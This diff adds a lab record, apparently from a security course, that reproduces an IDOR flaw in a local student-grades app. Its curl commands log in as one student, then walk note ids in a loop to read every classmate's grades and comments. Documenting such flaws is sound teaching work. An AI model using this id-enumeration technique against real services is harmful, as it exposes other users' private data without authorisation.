@@ -1,0 +1,47 @@
+# Class 8 — IDOR reproduction (captured BEFORE the fix)
+# App served over HTTPS at https://localhost (Class 5/7 nginx config); curl -k for self-signed cert.
+# Logged in as alice (student_id 6). The handler checked only "are you logged in?",
+# never "is this note yours?", so walking the note id leaked the whole class.
+
+$ curl -k -s -c alice.jar -d 'username=alice&password=alicepw' https://localhost/login -o /dev/null -w 'login HTTP %{http_code}\n'
+login HTTP 302
+
+### alice's own note id 1 — allowed, expected
+$ curl -k -s -b alice.jar https://localhost/api/notes/1
+{
+  "class_id": 1,
+  "class_name": "Mathematics",
+  "comment": "Late submission, but good quality.",
+  "grade": 16.2,
+  "id": 1,
+  "student": "alice",
+  "student_id": 6
+}
+
+### bob's note id 3 — alice was NEVER meant to see this (the leak)
+$ curl -k -s -b alice.jar https://localhost/api/notes/3
+{
+  "class_id": 1,
+  "class_name": "Mathematics",
+  "comment": "Solid work, keep it up.",
+  "grade": 12.6,
+  "id": 3,
+  "student": "bob",
+  "student_id": 7
+}
+
+### one for loop reads the whole class (ids 1..10)
+$ for id in $(seq 1 10); do echo -n "note $id: "; curl -k -s -b alice.jar https://localhost/api/notes/$id; echo; done
+note 1:  alice   Mathematics        16.2  "Late submission, but good quality."
+note 2:  alice   Computer Science   10.5  "Needs to review chapter 3."
+note 3:  bob     Mathematics        12.6  "Solid work, keep it up."
+note 4:  bob     Physics             9.0  "Late submission, but good quality."
+note 5:  carol   Mathematics        10.2  "Creative approach to the project."
+note 6:  carol   Physics            12.6  "Missed two labs."
+note 7:  dave    Physics            16.3  "Excellent participation in class."
+note 8:  dave    Mathematics        15.7  "Should ask more questions."
+note 9:  eve     Physics            10.4  "Should ask more questions."
+note 10: eve     Mathematics         9.1  "Very strong final exam."
+
+# Five students (alice, bob, carol, dave, eve), ten grades — all readable from one
+# authenticated student session. This is IDOR / broken access control (NotesApp flaw #7).
